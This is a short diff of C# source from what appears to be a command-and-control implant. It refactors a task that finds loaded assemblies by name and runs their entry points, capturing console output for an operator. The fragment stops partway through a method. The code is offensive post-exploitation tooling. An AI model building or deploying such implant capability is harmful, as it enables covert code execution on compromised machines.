@@ -1,12 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Linq;
 using System.IO;
-using System.Net;
 using System.Reflection;
 using System.Text;
-using System.Threading;
-using static System.Console;
 
 namespace Implant.Tasks.Execute
 {
@@ -17,20 +13,16 @@ namespace Implant.Tasks.Execute
 
         // would be cool if these could be called from a yaml or something
 
-        // load assems into running process for expansion of implant capability (done)
-        // create task to list loaded assems(see utils) and their methods for operator viewing (done) and allow operator to pass assem + method into
-        // task to execute given method from assem 
-
         private static Assembly GetAssemblyByName(string assemName){
             return AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(assem => assem.GetName().Name == assemName);
         }
 
         public static string ExecuteAssemEP(string assemName, string parameters){
-            var snapshotOut = Console.Out;
-            var snapshotErr = Console.Error;
+            TextWriter snapshotOut = Console.Out;
+            TextWriter snapshotErr = Console.Error;
 
-            var memStream = new MemoryStream();
-            var streamWriter = new StreamWriter(memStream) { AutoFlush = true };
+            MemoryStream memStream = new MemoryStream();
+            StreamWriter streamWriter = new StreamWriter(memStream) { AutoFlush = true };
 
             Console.SetOut(streamWriter);
             Console.SetError(streamWriter);
